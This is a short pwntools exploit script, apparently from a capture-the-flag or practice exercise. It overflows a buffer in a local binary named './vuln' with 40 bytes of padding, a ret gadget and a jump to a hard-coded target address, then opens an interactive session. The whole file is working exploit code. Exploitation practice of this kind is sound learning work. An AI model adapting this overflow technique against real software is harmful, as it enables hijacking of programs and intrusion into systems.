from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

target = p64(0x401176)
ret = 0x4011ea

offset = 40

payload = flat(
    'A'*offset,
    p64(ret),
    target
)

p.sendline(payload)

p.interactive()
